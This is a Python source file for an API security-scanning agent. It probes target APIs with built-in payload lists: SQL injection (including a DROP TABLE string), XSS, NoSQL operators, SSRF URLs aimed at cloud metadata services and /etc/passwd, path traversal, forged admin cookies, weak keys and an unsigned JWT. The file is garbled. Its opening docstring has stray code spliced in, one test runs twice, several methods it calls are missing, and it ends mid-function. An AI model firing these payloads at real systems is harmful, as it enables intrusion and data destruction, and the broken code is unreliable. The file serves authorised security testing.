# API Agent - Enhanced API Security Testing
"""
Enhanced API security testing agent with comprehensive vulnerability detection.
F        self.auth_bypass_payloads = [
            {'admin': True}, {'role': 'admin'}, {'is_admin': True},
            {'user_type': 'admin'}, {'permissions': ['admin']},
            {'access_level': 'admin'}, {'privilege': 'high'},
            {'auth': True}, {'authenticated': True}, {'verified': True}
        ]
        
        # Rate limiting test configuration
        self.rate_limit_config = {
            'requests_per_second': 10,
            'burst_requests': 50,
            'test_duration': 30
        }:
- OpenAPI/Swagger documentation parsing
- Advanced authentication handling (Bearer, API keys, cookies)
- Comprehensive vulnerability testing (SQLi, XSS, BOLA/IDOR, NoSQL, SSRF)
- Rate limiting and session management
- Structured JSON logging
"""

import requests
import asyncio
import aiohttp
import json
import time
import uuid
import yaml
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from typing import Dict, List, Any, Tuple, Optional
import logging
import re
from datetime import datetime
import base64
import hashlib

from .security_validator import SecurityValidator
from .vulnerability_filter import should_exclude_vulnerability
from .agent_config_utils import is_test_enabled, log_test_execution

logger = logging.getLogger(__name__)

class APIAgent:
    """Enhanced API security testing agent with advanced capabilities"""
    
    def __init__(self):
        self.session = requests.Session()
        self.config = SecurityValidator.get_safe_scan_config()
        
        # Configure session with advanced headers
        self.session.headers.update({
            'User-Agent': self.config['user_agent'],
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        })
        self.session.timeout = self.config['timeout']
        
        # Authentication state
        self.auth_tokens = {}
        self.cookies = {}
        self.api_keys = {}
        
        # Discovered endpoints from OpenAPI/Swagger
        self.discovered_endpoints = []
        self.api_documentation = None
        
        # Common API endpoints to discover
        self.common_endpoints = [
            '/api', '/api/v1', '/api/v2', '/api/v3', '/rest', '/graphql',
            '/swagger', '/swagger.json', '/swagger-ui', '/docs', '/doc',
            '/openapi.json', '/api-docs', '/redoc', '/v1/docs', '/v2/docs',
            '/admin/api', '/internal/api', '/private/api'
        ]
        
        # OpenAPI/Swagger documentation endpoints
        self.doc_endpoints = [
            '/swagger.json', '/swagger.yaml', '/swagger/v1/swagger.json',
            '/openapi.json', '/openapi.yaml', '/api-docs', '/docs.json',
            '/v1/swagger.json', '/v2/swagger.json', '/api/swagger.json',
            '/rest/swagger.json', '/api/docs', '/api/openapi.json'
        ]
        
        # Enhanced SQL injection payloads
        self.sql_injection_payloads = [
            "' OR '1'='1", "' OR 1=1--", "' OR 'a'='a", "'; DROP TABLE users;--",
            "' UNION SELECT null,null,null--", "' UNION SELECT 1,2,3--",
            "admin'--", "admin'/*", "' OR 1=1#", "' OR 1=1/*",
            "') OR '1'='1--", "') OR 1=1--", "1' OR '1'='1", "1 OR 1=1",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            "\"; SELECT * FROM users; --", "'; WAITFOR DELAY '00:00:05'--",
            "' OR SLEEP(5)--", "' OR pg_sleep(5)--"
        ]
        
        # XSS payloads for API parameters
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>"
        ]
        
        # NoSQL injection payloads
        self.nosql_injection_payloads = [
            {"$ne": None}, {"$ne": ""}, {"$regex": ".*"},
            {"$where": "return true"}, {"$gt": ""}, {"$lt": ""},
            {"$in": ["admin", "user"]}, {"$nin": []},
            {"$exists": True}, {"$exists": False},
            {"$or": [{"username": "admin"}, {"username": "user"}]},
            {"username": {"$ne": None}, "password": {"$ne": None}}
        ]
        
        # SSRF payloads
        self.ssrf_payloads = [
            "http://127.0.0.1:80", "http://localhost:22", "http://169.254.169.254",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd", "file:///c:/windows/system32/drivers/etc/hosts",
            "gopher://127.0.0.1:80", "dict://127.0.0.1:6379/info",
            "ldap://127.0.0.1", "ftp://127.0.0.1"
        ]
        
        # BOLA/IDOR test values
        self.idor_payloads = [
            "1", "2", "999", "0", "-1", "admin", "test", "user",
            str(uuid.uuid4()), "00000000-0000-0000-0000-000000000000",
            "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        ]
        
        # Authentication bypass payloads
        self.auth_bypass_payloads = [
            {'admin': True}, {'role': 'admin'}, {'is_admin': True},
            {'user_type': 'admin'}, {'permissions': ['admin']},
            {'access_level': 'admin'}, {'privilege': 'high'},
            {'auth': True}, {'authenticated': True}, {'verified': True}
        ]
        
        # Rate limiting test configuration
        self.rate_limit_config = {
            'requests_per_second': 10,
            'burst_requests': 50,
            'test_duration': 30
        }
    
    async def scan_target(self, target_url: str) -> Dict[str, Any]:
        """
        Main API scanning function
        
        Args:
            target_url: Target URL to scan
            
        Returns:
            Dict containing scan results and vulnerabilities
        """
        try:
            # Validate target
            SecurityValidator.validate_target(target_url)
            
            logger.info(f"🔌 Starting API security scan for: {target_url}")
            
            results = {
                'target': target_url,
                'timestamp': time.time(),
                'scan_type': 'api_security',
                'vulnerabilities': []
            }
            
            try:
                # Discover API endpoints
                logger.info("🔍 Discovering API endpoints...")
                endpoints = await self._discover_api_endpoints(target_url)
                results['discovered_endpoints'] = endpoints

                # Parse OpenAPI/Swagger documentation
                logger.info("📋 Parsing API documentation...")
                openapi_data = await self.parse_openapi_documentation(target_url)
                if openapi_data['endpoints']:
                    endpoints.extend(openapi_data['endpoints'])
                    results['openapi_data'] = openapi_data

                # Test BOLA/IDOR if enabled
                if is_test_enabled('api', 'bola'):
                    logger.info("🔐 Testing for BOLA/IDOR vulnerabilities...")
                    bola_vulns = await self._test_bola_vulnerabilities(target_url, endpoints)
                    results['vulnerabilities'].extend(bola_vulns)
                    log_test_execution('api', 'bola', True)
                else:
                    log_test_execution('api', 'bola', False)

                # Test broken authentication if enabled
                if is_test_enabled('api', 'broken_auth'):
                    logger.info("🔐 Testing API authentication mechanisms...")
                    auth_vulns = await self.test_authentication_mechanisms(target_url, endpoints)
                    results['vulnerabilities'].extend(auth_vulns)
                    log_test_execution('api', 'broken_auth', True)
                else:
                    log_test_execution('api', 'broken_auth', False)

                # Test for API injection vulnerabilities if enabled
                if is_test_enabled('api', 'injection'):
                    logger.info("💉 Testing for API injection vulnerabilities...")
                    injection_vulns = await self._test_api_injection(target_url, endpoints)
                    results['vulnerabilities'].extend(injection_vulns)
                    log_test_execution('api', 'injection', True)
                else:
                    log_test_execution('api', 'injection', False)

                # Test BOLA/IDOR vulnerabilities if enabled
                if is_test_enabled('api', 'bola'):
                    logger.info("🔒 Testing for BOLA/IDOR vulnerabilities...")
                    bola_vulns = await self.test_bola_idor_vulnerabilities(target_url, endpoints)
                    results['vulnerabilities'].extend(bola_vulns)
                    log_test_execution('api', 'bola', True)
                else:
                    log_test_execution('api', 'bola', False)

                # Test for excessive data exposure if enabled
                if is_test_enabled('api', 'excessive_data'):
                    logger.info("📊 Testing for sensitive data exposure...")
                    data_exposure_vulns = await self._test_data_exposure(target_url, endpoints)
                    results['vulnerabilities'].extend(data_exposure_vulns)
                    log_test_execution('api', 'excessive_data', True)
                else:
                    log_test_execution('api', 'excessive_data', False)

                # Test rate limiting if enabled
                if is_test_enabled('api', 'rate_limiting'):
                    logger.info("⏱️ Performing comprehensive rate limiting tests...")
                    rate_limit_vulns = await self.perform_rate_limit_testing(target_url, endpoints)
                    results['vulnerabilities'].extend(rate_limit_vulns)
                    log_test_execution('api', 'rate_limiting', True)
                else:
                    log_test_execution('api', 'rate_limiting', False)

                # Test function level authorization if enabled
                if is_test_enabled('api', 'function_level_auth'):
                    logger.info("🔑 Testing function level authorization...")
                    func_auth_vulns = await self._test_function_level_auth(target_url, endpoints)
                    results['vulnerabilities'].extend(func_auth_vulns)
                    log_test_execution('api', 'function_level_auth', True)
                else:
                    log_test_execution('api', 'function_level_auth', False)

                # Test mass assignment if enabled
                if is_test_enabled('api', 'mass_assignment'):
                    logger.info("� Testing for mass assignment vulnerabilities...")
                    mass_assign_vulns = await self._test_mass_assignment(target_url, endpoints)
                    results['vulnerabilities'].extend(mass_assign_vulns)
                    log_test_execution('api', 'mass_assignment', True)
                else:
                    log_test_execution('api', 'mass_assignment', False)

                # Test security misconfiguration if enabled
                if is_test_enabled('api', 'security_misconfiguration'):
                    logger.info("⚙️ Testing for security misconfigurations...")
                    config_vulns = await self._test_security_misconfig(target_url, endpoints)
                    results['vulnerabilities'].extend(config_vulns)
                    log_test_execution('api', 'security_misconfiguration', True)
                else:
                    log_test_execution('api', 'security_misconfiguration', False)
                
                # Test API versioning issues
                logger.info("🔄 Testing API versioning...")
                version_vulns = await self._test_api_versioning(target_url, endpoints)
                results['vulnerabilities'].extend(version_vulns)
                
                logger.info(f"✅ API security scan completed: found {len(results['vulnerabilities'])} vulnerabilities")
                
                # Add scan duration
                results['scan_duration'] = time.time() - results['timestamp']
                
                # Log results in structured JSON format
                self.log_scan_results_json(results)
                
            except Exception as scan_error:
                logger.error(f"❌ API scan error: {scan_error}")
                results['error'] = str(scan_error)
            
            return results
            
        except Exception as e:
            logger.error(f"❌ API security scan failed: {e}")
            raise
    
    async def _discover_api_endpoints(self, target_url: str) -> List[Dict[str, Any]]:
        """Discover API endpoints and documentation"""
        discovered_endpoints = []
        base_url = target_url.rstrip('/')
        
        # Test common API paths
        for endpoint in self.common_endpoints:
            try:
                test_url = f"{base_url}{endpoint}"
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code in [200, 201, 202]:
                    endpoint_info = {
                        'url': test_url,
                        'status_code': response.status_code,
                        'content_type': response.headers.get('Content-Type', ''),
                        'response_size': len(response.content),
                        'type': self._identify_endpoint_type(endpoint, response)
                    }
                    
                    # Check if it's API documentation
                    if self._is_api_documentation(response):
                        endpoint_info['contains_documentation'] = True
                        endpoint_info['exposed_endpoints'] = self._extract_endpoints_from_docs(response.text)
                    
                    discovered_endpoints.append(endpoint_info)
                    logger.info(f"✅ Found API endpoint: {test_url}")
                
                # Rate limiting
                await asyncio.sleep(self.config['request_delay'])
                
            except Exception as e:
                logger.debug(f"Error testing endpoint {endpoint}: {e}")
                continue
        
        return discovered_endpoints
    
    def _identify_endpoint_type(self, endpoint: str, response: requests.Response) -> str:
        """Identify the type of API endpoint"""
        content_type = response.headers.get('Content-Type', '').lower()
        
        if 'json' in content_type:
            return 'json_api'
        elif 'swagger' in endpoint or 'openapi' in endpoint:
            return 'api_documentation'
        elif 'graphql' in endpoint:
            return 'graphql'
        elif 'xml' in content_type:
            return 'xml_api'
        else:
            return 'unknown'
    
    def _is_api_documentation(self, response: requests.Response) -> bool:
        """Check if response contains API documentation"""
        content = response.text.lower()
        doc_indicators = [
            'swagger', 'openapi', 'api documentation', 'redoc',
            'api explorer', 'endpoints', 'paths', 'definitions'
        ]
        return any(indicator in content for indicator in doc_indicators)
    
    def _extract_endpoints_from_docs(self, content: str) -> List[str]:
        """Extract API endpoints from documentation"""
        endpoints = []
        
        # Try to parse as JSON (Swagger/OpenAPI)
        try:
            data = json.loads(content)
            if 'paths' in data:
                endpoints.extend(data['paths'].keys())
        except:
            pass
        
        # Extract from HTML/text using regex
        endpoint_patterns = [
            r'/api/[a-zA-Z0-9/_-]+',
            r'/v\d+/[a-zA-Z0-9/_-]+',
            r'GET|POST|PUT|DELETE\s+(/[a-zA-Z0-9/_-]+)'
        ]
        
        for pattern in endpoint_patterns:
            matches = re.findall(pattern, content)
            endpoints.extend(matches)
        
        return list(set(endpoints))  # Remove duplicates
    
    async def _test_api_authentication(self, target_url: str, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test API authentication mechanisms"""
        vulnerabilities = []
        
        for endpoint_info in endpoints:
            endpoint_url = endpoint_info['url']
            
            try:
                # Test unauthenticated access
                response = self.session.get(endpoint_url, timeout=10)
                
                if response.status_code == 200:
                    # Check if sensitive data is exposed without authentication
                    if self._contains_sensitive_data(response.text):
                        vulnerabilities.append({
                            'title': 'Unauthenticated API Access',
                            'severity': 'High',
                            'cvss': 7.5,
                            'description': f'API endpoint {endpoint_url} accessible without authentication',
                            'url': endpoint_url,
                            'parameter': 'authentication',
                            'remediation': 'Implement proper authentication for API endpoints',
                            'discovered_by': 'API Agent'
                        })
                
                # Test authentication bypass
                for payload in self.auth_bypass_payloads:
                    try:
                        bypass_response = self.session.post(
                            endpoint_url, 
                            json=payload, 
                            timeout=10
                        )
                        
                        if (bypass_response.status_code in [200, 201] and 
                            'admin' in bypass_response.text.lower()):
                            
                            vulnerabilities.append({
                                'title': 'API Authentication Bypass',
                                'severity': 'Critical',
                                'cvss': 9.0,
                                'description': f'Authentication bypass possible at {endpoint_url}',
                                'url': endpoint_url,
                                'parameter': 'auth_bypass',
                                'payload': json.dumps(payload),
                                'remediation': 'Implement proper server-side authentication validation',
                                'discovered_by': 'API Agent'
                            })
                            break
                        
                        # Rate limiting
                        await asyncio.sleep(self.config['request_delay'])
                        
                    except Exception as e:
                        logger.debug(f"Auth bypass test error: {e}")
                        continue
                
            except Exception as e:
                logger.debug(f"Auth test error for {endpoint_url}: {e}")
                continue
        
        return vulnerabilities
    
    def _contains_sensitive_data(self, content: str) -> bool:
        """Check if content contains sensitive data"""
        sensitive_patterns = [
            r'password', r'token', r'secret', r'key', r'credential',
            r'email', r'phone', r'ssn', r'credit.*card', r'api.*key'
        ]
        
        content_lower = content.lower()
        return any(re.search(pattern, content_lower) for pattern in sensitive_patterns)
    
    async def _test_api_injection(self, target_url: str, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for API injection vulnerabilities"""
        vulnerabilities = []
        
        # SQL injection payloads for APIs
        sql_payloads = [
            "' OR '1'='1",
            "1' OR '1'='1' --",
            "'; DROP TABLE users; --"
        ]
        
        # NoSQL injection payloads
        nosql_payloads = [
            {"$ne": None},
            {"$gt": ""},
            {"$where": "1==1"}
        ]
        
        for endpoint_info in endpoints:
            endpoint_url = endpoint_info['url']
            
            # Test SQL injection in JSON payloads
            for payload in sql_payloads:
                try:
                    test_data = {
                        'id': payload,
                        'username': payload,
                        'search': payload
                    }
                    
                    response = self.session.post(endpoint_url, json=test_data, timeout=10)
                    
                    # Check for SQL error indicators
                    sql_errors = [
                        'mysql_fetch_array', 'ORA-', 'Microsoft OLE DB',
                        'SQLServer JDBC Driver', 'PostgreSQL query failed'
                    ]
                    
                    if any(error in response.text for error in sql_errors):
                        vulnerabilities.append({
                            'title': 'API SQL Injection Vulnerability',
                            'severity': 'Critical',
                            'cvss': 9.1,
                            'description': f'SQL injection vulnerability in API endpoint {endpoint_url}',
                            'url': endpoint_url,
                            'parameter': 'json_payload',
                            'payload': json.dumps(test_data),
                            'remediation': 'Use parameterized queries and input validation',
                            'discovered_by': 'API Agent'
                        })
                        break
                    
                    # Rate limiting
                    await asyncio.sleep(self.config['request_delay'])
                    
                except Exception as e:
                    logger.debug(f"SQL injection test error: {e}")
                    continue
            
            # Test NoSQL injection
            for payload in nosql_payloads:
                try:
                    test_data = {
                        'filter': payload,
                        'query': payload
                    }
                    
                    response = self.session.post(endpoint_url, json=test_data, timeout=10)
                    
                    # Check for unusual response patterns
                    if (response.status_code == 200 and 
                        len(response.text) > 1000):  # Potentially dumped data
                        
                        vulnerabilities.append({
                            'title': 'Potential NoSQL Injection',
                            'severity': 'High',
                            'cvss': 7.5,
                            'description': f'Potential NoSQL injection in API endpoint {endpoint_url}',
                            'url': endpoint_url,
                            'parameter': 'nosql_query',
                            'payload': json.dumps(test_data),
                            'remediation': 'Implement proper NoSQL query validation',
                            'discovered_by': 'API Agent'
                        })
                        break
                    
                    # Rate limiting
                    await asyncio.sleep(self.config['request_delay'])
                    
                except Exception as e:
                    logger.debug(f"NoSQL injection test error: {e}")
                    continue
        
        return vulnerabilities
    
    async def _test_rate_limiting(self, target_url: str, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test API rate limiting on authentication and sensitive endpoints only"""
        vulnerabilities = []
        
        for endpoint_info in endpoints[:3]:  # Test only first 3 endpoints for safety
            endpoint_url = endpoint_info['url']
            
            # Only test rate limiting on authentication or sensitive endpoints
            sensitive_keywords = ['login', 'auth', 'token', 'password', 'admin', 'user', 'account']
            is_sensitive = any(keyword in endpoint_url.lower() for keyword in sensitive_keywords)
            
            if not is_sensitive:
                continue  # Skip rate limiting test for non-sensitive endpoints
            
            try:
                # Send multiple requests quickly
                responses = []
                start_time = time.time()
                
                for i in range(10):  # Limited number for safety
                    response = self.session.get(endpoint_url, timeout=5)
                    responses.append(response.status_code)
                    
                    if i < 9:  # Small delay except for last request
                        await asyncio.sleep(0.1)
                
                end_time = time.time()
                
                # Check if all requests succeeded (no rate limiting)
                if all(status == 200 for status in responses):
                    vulnerabilities.append({
                        'title': 'Missing Rate Limiting on Sensitive API Endpoint',
                        'severity': 'Medium',
                        'cvss': 6.0,
                        'description': f'No rate limiting detected on sensitive API endpoint {endpoint_url}',
                        'url': endpoint_url,
                        'parameter': 'sensitive_rate_limiting',
                        'remediation': 'Implement API rate limiting on authentication and sensitive endpoints',
                        'discovered_by': 'API Agent'
                    })
                
            except Exception as e:
                logger.debug(f"Rate limiting test error for {endpoint_url}: {e}")
                continue
        
        return vulnerabilities
    
    async def _test_data_exposure(self, target_url: str, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for sensitive data exposure in API responses"""
        vulnerabilities = []
        
        for endpoint_info in endpoints:
            endpoint_url = endpoint_info['url']
            
            try:
                response = self.session.get(endpoint_url, timeout=10)
                
                if response.status_code == 200:
                    # Check for sensitive data patterns
                    sensitive_patterns = {
                        'password': r'password["\']?\s*:\s*["\'][^"\']+["\']',
                        'api_key': r'api[_-]?key["\']?\s*:\s*["\'][^"\']+["\']',
                        'secret': r'secret["\']?\s*:\s*["\'][^"\']+["\']',
                        'token': r'token["\']?\s*:\s*["\'][^"\']+["\']',
                        'email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
                        'phone': r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b'
                    }
                    
                    for data_type, pattern in sensitive_patterns.items():
                        if re.search(pattern, response.text, re.IGNORECASE):
                            vulnerabilities.append({
                                'title': f'Sensitive Data Exposure: {data_type.title()}',
                                'severity': 'Medium',
                                'cvss': 6.0,
                                'description': f'{data_type.title()} data exposed in API response from {endpoint_url}',
                                'url': endpoint_url,
                                'parameter': 'response_data',
                                'remediation': f'Remove or mask {data_type} data from API responses',
                                'discovered_by': 'API Agent'
                            })
                
            except Exception as e:
                logger.debug(f"Data exposure test error for {endpoint_url}: {e}")
                continue
        
        return vulnerabilities
    
    async def _test_api_versioning(self, target_url: str, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for API versioning issues"""
        vulnerabilities = []
        
        base_url = target_url.rstrip('/')
        
        # Test for multiple API versions
        version_patterns = ['/v1/', '/v2/', '/v3/', '/api/v1/', '/api/v2/']
        
        accessible_versions = []
        
        for version in version_patterns:
            try:
                test_url = f"{base_url}{version}"
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code == 200:
                    accessible_versions.append(version)
                
                # Rate limiting
                await asyncio.sleep(self.config['request_delay'])
                
            except Exception as e:
                logger.debug(f"Version test error for {version}: {e}")
                continue
        
        # If multiple versions are accessible, it might be a security issue
        if len(accessible_versions) > 1:
            vulnerabilities.append({
                'title': 'Multiple API Versions Accessible',
                'severity': 'Low',
                'cvss': 3.0,
                'description': f'Multiple API versions accessible: {", ".join(accessible_versions)}',
                'url': target_url,
                'parameter': 'api_versioning',
                'remediation': 'Ensure old API versions are properly deprecated and secured',
                'discovered_by': 'API Agent'
            })
        
        return vulnerabilities

    async def parse_openapi_documentation(self, target_url: str) -> Dict[str, Any]:
        """
        Parse OpenAPI/Swagger documentation to discover endpoints
        
        Args:
            target_url: Base URL of the target
            
        Returns:
            Dict containing parsed API documentation and endpoints
        """
        openapi_paths = [
            '/swagger.json', '/swagger.yaml', '/openapi.json', '/openapi.yaml',
            '/api-docs', '/docs', '/redoc', '/swagger-ui.html',
            '/v1/swagger.json', '/v2/swagger.json', '/api/v1/swagger.json'
        ]
        
        base_url = target_url.rstrip('/')
        parsed_data = {
            'endpoints': [],
            'authentication_schemes': [],
            'parameters': [],
            'documentation_url': None
        }
        
        for path in openapi_paths:
            try:
                doc_url = f"{base_url}{path}"
                response = self.session.get(doc_url, timeout=10)
                
                if response.status_code == 200:
                    logger.info(f"✅ Found API documentation at: {doc_url}")
                    parsed_data['documentation_url'] = doc_url
                    
                    # Try to parse JSON
                    try:
                        if path.endswith('.json') or 'json' in response.headers.get('Content-Type', ''):
                            doc_data = response.json()
                        else:
                            # Try YAML parsing
                            import yaml
                            doc_data = yaml.safe_load(response.text)
                        
                        # Extract endpoints
                        if 'paths' in doc_data:
                            for endpoint_path, methods in doc_data['paths'].items():
                                for method, details in methods.items():
                                    if isinstance(details, dict):
                                        endpoint_info = {
                                            'path': endpoint_path,
                                            'method': method.upper(),
                                            'full_url': f"{base_url}{endpoint_path}",
                                            'parameters': details.get('parameters', []),
                                            'security': details.get('security', []),
                                            'summary': details.get('summary', ''),
                                            'deprecated': details.get('deprecated', False)
                                        }
                                        parsed_data['endpoints'].append(endpoint_info)
                        
                        # Extract authentication schemes
                        if 'securityDefinitions' in doc_data:
                            parsed_data['authentication_schemes'] = doc_data['securityDefinitions']
                        elif 'components' in doc_data and 'securitySchemes' in doc_data['components']:
                            parsed_data['authentication_schemes'] = doc_data['components']['securitySchemes']
                        
                        logger.info(f"📋 Parsed {len(parsed_data['endpoints'])} endpoints from API documentation")
                        break
                        
                    except Exception as parse_error:
                        logger.debug(f"Failed to parse API documentation: {parse_error}")
                        continue
                
                # Rate limiting
                await asyncio.sleep(self.config['request_delay'])
                
            except Exception as e:
                logger.debug(f"Error fetching API documentation from {path}: {e}")
                continue
        
        return parsed_data

    async def test_authentication_mechanisms(self, target_url: str, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """
        Test various authentication mechanisms including bearer tokens, cookies, and API keys
        
        Args:
            target_url: Base URL of the target
            endpoints: List of discovered endpoints
            
        Returns:
            List of authentication-related vulnerabilities
        """
        vulnerabilities = []
        
        # Test bearer token authentication
        bearer_vulns = await self._test_bearer_token_auth(target_url, endpoints)
        vulnerabilities.extend(bearer_vulns)
        
        # Test cookie-based authentication
        cookie_vulns = await self._test_cookie_auth(target_url, endpoints)
        vulnerabilities.extend(cookie_vulns)
        
        # Test API key authentication
        api_key_vulns = await self._test_api_key_auth(target_url, endpoints)
        vulnerabilities.extend(api_key_vulns)
        
        # Test JWT token vulnerabilities
        jwt_vulns = await self._test_jwt_vulnerabilities(target_url, endpoints)
        vulnerabilities.extend(jwt_vulns)
        
        return vulnerabilities

    async def _test_bearer_token_auth(self, target_url: str, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test bearer token authentication vulnerabilities"""
        vulnerabilities = []
        
        # Test weak/predictable tokens
        weak_tokens = [
            'Bearer 123456', 'Bearer admin', 'Bearer test', 'Bearer token',
            'Bearer 000000', 'Bearer 111111', 'Bearer password', 'Bearer secret'
        ]
        
        for endpoint_info in endpoints[:5]:  # Test first 5 endpoints
            endpoint_url = endpoint_info.get('url', endpoint_info.get('full_url', ''))
            
            for token in weak_tokens:
                try:
                    headers = {'Authorization': token}
                    response = self.session.get(endpoint_url, headers=headers, timeout=10)
                    
                    if response.status_code in [200, 201, 202] and 'unauthorized' not in response.text.lower():
                        vulnerabilities.append({
                            'title': 'Weak Bearer Token Accepted',
                            'severity': 'High',
                            'cvss': 7.5,
                            'description': f'Weak bearer token "{token}" accepted at {endpoint_url}',
                            'url': endpoint_url,
                            'parameter': 'Authorization',
                            'payload': token,
                            'remediation': 'Implement strong token validation and generation',
                            'discovered_by': 'API Agent'
                        })
                        break
                    
                    await asyncio.sleep(self.config['request_delay'])
                    
                except Exception as e:
                    logger.debug(f"Bearer token test error: {e}")
                    continue
        
        return vulnerabilities

    async def _test_cookie_auth(self, target_url: str, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test cookie-based authentication vulnerabilities"""
        vulnerabilities = []
        
        # Test session manipulation
        session_cookies = [
            {'session_id': 'admin'}, {'user_id': '1'}, {'role': 'admin'},
            {'is_admin': 'true'}, {'authenticated': 'true'}, {'privilege': 'high'}
        ]
        
        for endpoint_info in endpoints[:5]:
            endpoint_url = endpoint_info.get('url', endpoint_info.get('full_url', ''))
            
            for cookies in session_cookies:
                try:
                    response = self.session.get(endpoint_url, cookies=cookies, timeout=10)
                    
                    if (response.status_code == 200 and 
                        ('admin' in response.text.lower() or 'dashboard' in response.text.lower())):
                        
                        vulnerabilities.append({
                            'title': 'Session Cookie Manipulation',
                            'severity': 'High',
                            'cvss': 7.0,
                            'description': f'Session manipulation possible via cookies at {endpoint_url}',
                            'url': endpoint_url,
                            'parameter': 'cookies',
                            'payload': json.dumps(cookies),
                            'remediation': 'Implement proper server-side session validation',
                            'discovered_by': 'API Agent'
                        })
                        break
                    
                    await asyncio.sleep(self.config['request_delay'])
                    
                except Exception as e:
                    logger.debug(f"Cookie auth test error: {e}")
                    continue
        
        return vulnerabilities

    async def _test_api_key_auth(self, target_url: str, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test API key authentication vulnerabilities"""
        vulnerabilities = []
        
        # Test weak API keys
        weak_api_keys = [
            'test', 'admin', '123456', 'password', 'secret', 'key',
            'api_key', 'demo', 'default', '000000'
        ]
        
        api_key_headers = ['X-API-Key', 'API-Key', 'ApiKey', 'X-Api-Key', 'Authorization']
        api_key_params = ['api_key', 'apikey', 'key', 'token']
        
        for endpoint_info in endpoints[:3]:
            endpoint_url = endpoint_info.get('url', endpoint_info.get('full_url', ''))
            
            # Test API key in headers
            for header_name in api_key_headers:
                for api_key in weak_api_keys:
                    try:
                        headers = {header_name: api_key}
                        response = self.session.get(endpoint_url, headers=headers, timeout=10)
                        
                        if response.status_code == 200 and 'unauthorized' not in response.text.lower():
                            vulnerabilities.append({
                                'title': 'Weak API Key Accepted',
                                'severity': 'High',
                                'cvss': 7.5,
                                'description': f'Weak API key "{api_key}" accepted via header {header_name}',
                                'url': endpoint_url,
                                'parameter': header_name,
                                'payload': api_key,
                                'remediation': 'Implement strong API key validation and generation',
                                'discovered_by': 'API Agent'
                            })
                            break
                        
                        await asyncio.sleep(self.config['request_delay'])
                        
                    except Exception as e:
                        logger.debug(f"API key header test error: {e}")
                        continue
            
            # Test API key in URL parameters
            for param_name in api_key_params:
                for api_key in weak_api_keys:
                    try:
                        params = {param_name: api_key}
                        response = self.session.get(endpoint_url, params=params, timeout=10)
                        
                        if response.status_code == 200 and 'unauthorized' not in response.text.lower():
                            vulnerabilities.append({
                                'title': 'Weak API Key in URL Parameter',
                                'severity': 'High',
                                'cvss': 7.5,
                                'description': f'Weak API key "{api_key}" accepted via parameter {param_name}',
                                'url': endpoint_url,
                                'parameter': param_name,
                                'payload': api_key,
                                'remediation': 'Use strong API keys and avoid URL parameters for authentication',
                                'discovered_by': 'API Agent'
                            })
                            break
                        
                        await asyncio.sleep(self.config['request_delay'])
                        
                    except Exception as e:
                        logger.debug(f"API key parameter test error: {e}")
                        continue
        
        return vulnerabilities

    async def _test_jwt_vulnerabilities(self, target_url: str, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test JWT token vulnerabilities"""
        vulnerabilities = []
        
        # Test weak JWT secrets
        weak_jwt_tokens = [
            # None algorithm JWT
            'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.',
            # Weak secret JWT
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsIm5hbWUiOiJBZG1pbiBVc2VyIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid_signature'
        ]
        
        for endpoint_info in endpoints[:3]:
            endpoint_url = endpoint_info.get('url', endpoint_info.get('full_url', ''))
            
            for jwt_token in weak_jwt_tokens:
                try:
                    headers = {'Authorization': f'Bearer {jwt_token}'}
                    response = self.session.get(endpoint_url, headers=headers, timeout=10)
                    
                    if response.status_code == 200 and 'admin' in response.text.lower():
                        vulnerabilities.append({
                            'title': 'JWT Security Vulnerability',
                            'severity': 'Critical',
                            'cvss': 9.0,
                            'description': f'JWT vulnerability detected at {endpoint_url}',
                            'url': endpoint_url,
                            'parameter': 'Authorization',
                            'payload': f'Bearer {jwt_token}',
                            'remediation': 'Implement proper JWT validation with strong secrets',
                            'discovered_by': 'API Agent'
                        })
                        break
                    
                    await asyncio.sleep(self.config['request_delay'])
                    
                except Exception as e:
                    logger.debug(f"JWT test error: {e}")
                    continue
        
        return vulnerabilities

    async def test_bola_idor_vulnerabilities(self, target_url: str, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """
        Test for Broken Object Level Authorization (BOLA) and Insecure Direct Object Reference (IDOR) vulnerabilities
        
        Args:
            target_url: Base URL of the target
            endpoints: List of discovered endpoints
            
        Returns:
            List of BOLA/IDOR vulnerabilities
        """
        vulnerabilities = []
        
        # Common object ID patterns to test
